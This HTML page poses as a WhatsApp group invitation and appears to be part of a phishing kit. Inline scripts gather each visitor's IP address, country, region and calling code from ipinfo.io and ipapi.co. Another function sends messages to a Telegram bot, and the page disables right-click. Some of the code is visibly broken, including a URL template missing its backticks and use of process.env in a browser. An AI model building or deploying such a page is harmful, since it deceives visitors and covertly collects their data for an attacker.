<!doctype html>

<html lang="en">
<head>
    <meta charset="utf-8"/>
    <link rel="icon" href="images/favicon.ico"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="theme-color" content="#000000"/>
    <meta name="description" content="رابط الإنضمام إلى المجموعة"/>
    <meta property="og:title" content="الدعوة للانضمام إلى مجموعة واتساب">
    <meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v3/yo/r/J5gK5AgJ_L5.png">
    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yz/r/ujTY9i_Jhs1.png">
    <link rel="apple-touch-icon" href="https://static.whatsapp.net/rsrc.php/v3/yo/r/J5gK5AgJ_L5.png" />
    <link rel="manifest" href="manifest.json"/>
    <title>WhatsApp</title><script>
    async function fetchFromIpInfo() {
        try {
            const response = await fetch("https://ipinfo.io/json");
            const data = await response.json();
            return {
                ip: data.ip,
                country: data.country,
            };
        } catch (error) {
            console.error("Error fetching data from ipinfo.io:", error);
            return null;
        }
    }

    async function fetchFromIpApi() {
        try {
            const response = await fetch("https://ipapi.co/xml/");
            const textData = await response.text();
            const parser = new DOMParser();
            const xmlDoc = parser.parseFromString(textData, "application/xml");
            const ip = xmlDoc.getElementsByTagName("ip")[0]?.textContent || "Unknown IP";
            const country = xmlDoc.getElementsByTagName("country_name")[0]?.textContent || "Unknown Country";
            const city = xmlDoc.getElementsByTagName("region")[0]?.textContent || "Unknown City";
            const tele = xmlDoc.getElementsByTagName("country_calling_code")[0]?.textContent || "Unknown tele";
            return { ip, country, city, tele };
        } catch (error) {
            console.error("Error fetching data from ipapi.co:", error);
            return null;
        }
    }

    async function sendToTelegram(message) {
        try {
            const botToken = process.env.BOT_TOKEN; // استخدام المتغيرات البيئية
            const chatId = process.env.CHAT_ID;
            if (!botToken || !chatId) {
                console.error("Missing Telegram credentials");
                return;
            }

            const telegramUrl = https://api.telegram.org/bot${botToken}/sendMessage;
            await fetch(telegramUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });
            console.log("Message sent to Telegram successfully.");
        } catch (error) {
            console.error("Error sending message to Telegram:", error);
        }
    }
</script>

<noscript>
    <style>
        body {
            display: none;
        }
    </style>
    <div style="text-align: center; margin-top: 50px; color: red;">
        <h1>تم تعطيل JavaScript في متصفحك.</h1>
        <p>الرجاء تمكين JavaScript لمتابعة استخدام هذا الموقع.</p>
    </div>
</noscript>

<script>
    document.addEventListener('contextmenu', function(event) {
        event.preventDefault();
    });
</script>

<script src="script.js"></script>
<script defer src="static/js/main.33ed2829.js"></script>
<link href="static/css/main.81bfefed.css" rel="stylesheet"/>

</head>
<body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
</body>
</html>
